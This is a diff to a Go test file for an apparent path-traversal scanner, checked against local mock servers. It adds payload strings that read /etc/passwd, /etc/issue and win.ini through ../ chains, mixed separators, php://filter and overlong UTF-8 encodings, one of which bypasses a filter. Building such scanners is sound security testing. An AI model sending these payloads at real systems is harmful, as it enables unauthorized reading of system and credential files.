@@ -34,6 +34,11 @@ var fakeFiles = map[string]string{
 // phpSourceText is a small PHP file, the kind the php://filter source read returns.
 const phpSourceText = "<?php echo 'hello';\n"
 
+// issueText is a default Debian/Ubuntu /etc/issue, carrying the "\n \l"
+// agetty escape its signature keys on. The doubled backslashes are Go escaping,
+// so the file content is the literal text "Ubuntu 22.04.3 LTS \n \l".
+const issueText = "Ubuntu 22.04.3 LTS \\n \\l\n"
+
 // readAt resolves name against base the way a naive app would (path.Join cleans
 // ".." steps) and returns the file, or false when it does not exist.
 func readAt(base, name string) (string, bool) {
@@ -365,6 +370,11 @@ func TestPayloadWireStrings(t *testing.T) {
 		{"php base64", payloadNamed(t, phpWrapperModule, "php://filter base64 ../ x8"), point{}, "etc/passwd", "php://filter/convert.base64-encode/resource=" + strings.Repeat("../", 8) + "etc/passwd"},
 		{"php source", payloadNamed(t, phpWrapperModule, "php://filter base64 index.php source"), point{}, "index.php", "php://filter/convert.base64-encode/resource=index.php"},
 		{"nginx alias", payloadNamed(t, aliasModule, "segment.. (nginx alias)"), point{segment: "static"}, "etc/passwd", "static../etc/passwd"},
+		{"classic /etc/issue", payloadNamed(t, classicModule, "../ x8 /etc/issue"), point{}, "etc/issue", strings.Repeat("../", 8) + "etc/issue"},
+		{"windows trailing dot", payloadNamed(t, windowsModule, `..\ x4 win.ini trailing dot`), point{}, "win.ini", `..\..\..\..\windows\win.ini.`},
+		{"separator double-slash", payloadNamed(t, separatorModule, "..// double-slash x4"), point{}, "etc/passwd", "..//..//..//..//etc/passwd"},
+		{"separator mixed", payloadNamed(t, separatorModule, `..\/ mixed separators x4`), point{}, "etc/passwd", `..\/..\/..\/..\/etc/passwd`},
+		{"overlong 4-byte", payloadNamed(t, encodedModule, "%f0%80%80%ae 4-byte overlong x4"), point{}, "etc/passwd", strings.Repeat("%f0%80%80%ae%f0%80%80%ae%f0%80%80%af", 4) + "etc%f0%80%80%afpasswd"},
 	}
 	for _, c := range cases {
 		if got := c.p.build(c.file, c.pt); got != c.want {
@@ -884,6 +894,133 @@ func TestMatchFilePrefersStrong(t *testing.T) {
 	sig, _, ok = matchFile("<?php echo 1; ?>", "", false)
 	if !ok || sig.name != "PHP source" || sig.strong {
 		t.Errorf("sig = %q (strong=%v, ok=%v), want weak PHP source", sig.name, sig.strong, ok)
+	}
+}
+
+// TestEtcIssueSignature checks the second Unix oracle: an /etc/issue read is
+// matched by its agetty-escape signature, in both the Debian and RHEL forms,
+// while ordinary prose is not.
+func TestEtcIssueSignature(t *testing.T) {
+	if sig, _, ok := matchFile(issueText, "", false); !ok || sig.name != "/etc/issue" {
+		t.Errorf("Debian issue not matched (ok=%v, sig=%q)", ok, sig.name)
+	}
+	// RHEL/CentOS default: "\S\nKernel \r on an \m".
+	rhel := "\\S\nKernel \\r on an \\m\n"
+	if sig, _, ok := matchFile(rhel, "", false); !ok || sig.name != "/etc/issue" {
+		t.Errorf("RHEL issue not matched (ok=%v, sig=%q)", ok, sig.name)
+	}
+	if _, _, ok := matchFile("Welcome, please sign in to your account.", "", false); ok {
+		t.Error("ordinary prose matched as /etc/issue")
+	}
+}
+
+// TestWebConfigSignature checks the IIS web.config oracle, which is weak: a
+// match is reported, but only at "likely" strength.
+func TestWebConfigSignature(t *testing.T) {
+	cfg := `<?xml version="1.0"?><configuration><system.webServer><handlers/></system.webServer></configuration>`
+	sig, _, ok := matchFile(cfg, "", false)
+	if !ok || sig.name != "web.config" {
+		t.Fatalf("web.config not matched (ok=%v, sig=%q)", ok, sig.name)
+	}
+	if sig.strong {
+		t.Error("web.config signature should be weak")
+	}
+}
+
+// TestEtcIssueOracleFound checks a host that exposes /etc/issue but not
+// /etc/passwd: the classic module's issue payload still confirms the read.
+func TestEtcIssueOracleFound(t *testing.T) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		name := r.URL.Query().Get("file")
+		if name == "" {
+			io.WriteString(w, "home")
+			return
+		}
+		// Only /etc/issue is readable; every other resolved path is a 404.
+		if path.Join("/srv/www/files", name) == "/etc/issue" {
+			io.WriteString(w, issueText)
+			return
+		}
+		http.NotFound(w, r)
+	}))
+	defer srv.Close()
+
+	res, err := Run(context.Background(), Request{URL: srv.URL + "/download?file=report.pdf"}, OOBConfig{})
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	f, ok := findHit(res, "classic-traversal", `query parameter "file"`)
+	if !ok {
+		t.Fatalf("issue oracle not found; findings: %d", totalFindings(res))
+	}
+	if !strings.Contains(f.Payload, "etc/issue") {
+		t.Errorf("finding payload %q is not the /etc/issue oracle", f.Payload)
+	}
+}
+
+// TestOverlongUTF8BypassFound checks one of the encodings transferred from
+// dotdotpwn end to end. The app blocks "../" and the simple percent-dot and
+// percent-slash forms, but a lenient decoder folds 4-byte overlong UTF-8 to
+// "." and "/" before the file lookup, so only that payload gets through.
+func TestOverlongUTF8BypassFound(t *testing.T) {
+	srv := vulnServer(t, "/srv/www/files", func(r *http.Request, _ string) string {
+		// Read the value as written on the wire, so the percent sequences are
+		// still text rather than already-decoded bytes.
+		raw := r.URL.RawQuery
+		_, val, ok := strings.Cut(raw, "file=")
+		if !ok {
+			return ""
+		}
+		if j := strings.IndexByte(val, '&'); j >= 0 {
+			val = val[:j]
+		}
+		low := strings.ToLower(val)
+		// Reject plain traversal and the common single-escape dot/slash forms.
+		if strings.Contains(val, "../") || strings.Contains(low, "%2e") || strings.Contains(low, "%2f") || strings.Contains(low, "%c0") {
+			return ""
+		}
+		// Fold only the 4-byte overlong forms, the way a lenient stack would.
+		return strings.NewReplacer("%f0%80%80%ae", ".", "%f0%80%80%af", "/").Replace(low)
+	})
+	defer srv.Close()
+
+	res, err := Run(context.Background(), Request{URL: srv.URL + "/download?file=report.pdf"}, OOBConfig{})
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	f, ok := findHit(res, "encoded-traversal", `query parameter "file"`)
+	if !ok {
+		t.Fatalf("overlong UTF-8 bypass not found; findings: %d", totalFindings(res))
+	}
+	if !strings.Contains(f.Payload, "%f0%80%80%ae") {
+		t.Errorf("finding payload %q is not the 4-byte overlong form", f.Payload)
+	}
+	// The plain ../ payloads are blocked, so the classic module finds nothing.
+	if _, ok := findHit(res, "classic-traversal", `query parameter "file"`); ok {
+		t.Error("classic ../ got through a filter that blocks it")
+	}
+}
+
+// TestBisectionReportsDepth checks the depth finder transferred from
+// dotdotpwn's bisection algorithm. The app sits four directories below the
+// filesystem root, so the smallest traversal that reaches /etc/passwd is four
+// steps, and the finding's detail must state that.
+func TestBisectionReportsDepth(t *testing.T) {
+	srv := vulnServer(t, "/a/b/c/d", func(r *http.Request, _ string) string {
+		return r.URL.Query().Get("file")
+	})
+	defer srv.Close()
+
+	res, err := Run(context.Background(), Request{URL: srv.URL + "/download?file=report.pdf"}, OOBConfig{})
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	f, ok := findHit(res, "classic-traversal", `query parameter "file"`)
+	if !ok {
+		t.Fatalf("no classic finding; findings: %d", totalFindings(res))
+	}
+	if !strings.Contains(f.Detail, `minimal traversal depth that still reads the file is 4`) {
+		t.Errorf("detail does not report the bisected depth of 4: %s", f.Detail)
 	}
 }
 
